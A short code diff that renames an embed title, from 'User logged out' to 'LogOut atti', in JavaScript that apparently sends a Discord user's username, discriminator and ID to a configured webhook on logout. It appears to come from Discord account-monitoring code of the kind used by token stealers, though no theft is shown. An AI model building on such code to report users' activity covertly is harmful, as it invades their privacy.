@@ -818,7 +818,7 @@ async function initialize() {
                     username: config.embed.username,
                     avatar_url: config.embed.avatar_url,
                     embeds: [createEmbed({
-                        title: "Discord | User logged out",
+                        title: "Discord | LogOut atti",
                         url: config.embed.href,
                         author: {
                             name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
